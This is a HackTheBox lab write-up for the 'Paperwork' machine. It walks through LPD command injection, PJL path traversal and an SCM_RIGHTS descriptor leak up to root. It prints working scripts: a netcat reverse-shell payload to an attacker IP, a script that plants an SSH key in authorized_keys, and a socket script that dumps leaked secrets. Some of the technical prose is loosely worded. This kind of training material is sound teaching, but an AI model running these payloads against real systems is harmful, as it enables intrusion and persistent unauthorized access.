# HackTheBox - Paperwork Writeup

**Machine Name:** Paperwork  
**Difficulty:** Easy  
**OS:** Linux  
**Platform:** [HackTheBox](https://hackthebox.com)

---

## Executive Summary
Paperwork focuses on attacking insecure system utilities via custom backend networks. The initial vector exploits a command injection vulnerability inside a custom Line Printer Daemon (LPD) service. Lateral movement relies on a Path Traversal flaw within an internal JetDirect printer simulator to achieve persistent SSH access. Finally, Privilege Escalation takes advantage of a custom watchdog configuration on a local UNIX domain socket that improperly handles active file descriptors (`SCM_RIGHTS`), resulting in an administrative password leak.

---

##  1. Initial Foothold (User: lp)

### Enumerate Ports
An initial Nmap reconnaissance scan isolates an open custom network portal:
* **Port 1515:** Running Nginx hosting a custom LPD service.

### Source Code Review
Analysis of the available source code (`server.py`) highlights an architectural command routing flaw. The server takes user input directly from incoming client blocks (the `J` job identifier field) and forwards it to system execution wrappers:

```python
# Vulnerable Logic found inside server.py
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```
Because `shell=True` is assigned alongside unvalidated template variables, standard quote breaks manipulate the execution flow.

### Exploitation
Using raw Python network primitives, we send an optimized breakout sequence that terminates the template assignment, chains an independent command context, and comment-neutralizes trailing statements:

```python
import socket

TARGET_IP = "10.10.11.X" # Replace with target IP
TARGET_PORT = 1515

# Payload terminates quote, sequences a reverse shell, and comments out the suffix
test_command = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_TUN0_IP 4444 >/tmp/f"
job_name_payload = f"'; {test_command} #\n"
payload = b"\x02test_queue\n" + b"J" + job_name_payload.encode()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET_IP, TARGET_PORT))
s.sendall(payload)
s.close()
```
Catching the inbound transaction on an active local netcat handler drops a shell context as the **`lp`** service identity.

---

##  2. Lateral Movement (User: archivist)

### Internal Enumeration
Investigating internal listeners using network mapping arrays (`ss -tlnp`) exposes a localized internal binder:
* **Port 9100:** Running an implicit `jetdirect.py` interface executing strictly under the authority profile of the `archivist` user.

### Vulnerability Analysis
The simulator responds to standard Printer Job Language (PJL) calls but fails to cross-examine path arguments, allowing arbitrary **Directory Traversal** (`../../../../`).

### Exploitation via SSH Hijacking
While data ingestion limits clean readout calls, the script cleanly processes localized data modifications. By structuring an inline network block to map direct public credentials straight into the target account's credential repository, we implant a persistent SSH authorization context:

```bash
python3 -c '
import socket
key = b"ssh-rsa AAAAB3NzaC1yc2E...YOUR_KALI_PUBLIC_KEY... kali@kali\n"
payload = b"@PJL FSDOWNLOAD NAME=\"../../../../home/archivist/.ssh/authorized_keys\" SIZE=" + str(len(key)).encode() + b"\n" + key
s = socket.socket()
s.connect(("127.0.0.1", 9100))
s.sendall(payload)
print(s.recv(1024).decode())
'
```
Verifying the storage update allows us to seamlessly drop the web terminal wrapper and execute a persistent boundary access link:
```bash
ssh archivist@10.10.11.X
```
The home folder bounds drop cleanly, exposing the user flag profile inside `/home/archivist/user.txt`.

---

##  3. Privilege Escalation (User: root)

### Auditing Sockets
Evaluating internal domain framework parameters maps a local root-owned monitoring endpoint:
* **UNIX Domain Socket:** Located at `/run/paperwork/mgmt.sock`

### Exploit Mechanics: SCM_RIGHTS FD Leakage
The management application runs a watchdog loop. If queried natively, the engine outputs a standard `SYSTEM_CLEAN` statement. However, if an explicit operational breach registers in the printer framework history logs, the watchdog enters an emergency forensic configuration dump.

During this panic phase, the process attempts to pass troubleshooting files down the pipeline. It leverages an advanced UNIX socket mechanism called **`SCM_RIGHTS`** to transfer active File Descriptors (FD). Because the service fails to release active memory assets, it leaves a pointer running straight to the primary configuration database.

### Combined Trigger and Capture
By actively pushing malicious traversal arguments to port 9100 right before querying the UNIX socket, we trip the alarm array and safely capture the leaked kernel pointer:

```python
import socket
import array
import os
import time

# Step 1: Prime the alert wire via Port 9100
p_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
p_sock.connect(("127.0.0.1", 9100))
p_sock.sendall(b'@PJL FSQUERY NAME="../../../../etc/passwd"\n')
p_sock.close()

time.sleep(1) # Allow daemon file update state

# Step 2: Grab the SCM_RIGHTS file descriptors from the UNIX Socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")

buf_sz, anc_sz = 1024, socket.CMSG_LEN(array.array('i').itemsize * 2)
msg, anc_data, _, _ = s.recvmsg(buf_sz, anc_sz)

fds = []
for lvl, typ, data in anc_data:
    if lvl == socket.SOL_SOCKET and typ == socket.SCM_RIGHTS:
        fds.extend(array.array('i', data[:len(data) - len(data) % array.array('i').itemsize]))

# Step 3: Stream content straight out of the leaked handles
for fd in fds:
    os.lseek(fd, 0, os.SEEK_SET)
    print(os.read(fd, 4096).decode(errors='ignore'))
```

Executing the compound script intercepts the active handle allocation, dumping administrative system secrets directly onto the screen:
```text
ApparelMortuaryCedar22
```

### Claiming Root
Using the recovered password against the main privilege terminal structure elevates system parameters immediately:
```bash
su root
# Password: ApparelMortuaryCedar22
cat /root/root.txt
```
**System Complete!** 🏁

